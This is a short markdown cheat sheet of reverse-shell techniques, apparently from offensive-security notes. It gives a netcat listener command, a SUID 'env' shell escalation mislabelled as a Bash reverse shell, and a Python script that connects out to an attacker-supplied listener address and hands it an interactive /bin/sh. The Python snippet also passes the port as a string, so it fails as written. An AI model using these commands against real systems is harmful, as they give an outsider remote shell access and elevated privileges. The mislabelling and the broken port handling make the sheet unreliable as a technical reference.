## Rev Shells 

See also: [RevShells](https://www.revshells.com/).

#### Listener

```bash
nc -lvnp <port_number>
```


#### Bash

```bash
./env /bin/sh -p
```

#### Python

```python
import os, socket, subprocess
ip_address = "<listener_ip_address>"
port = "<port_number>"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((ip_address,port));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
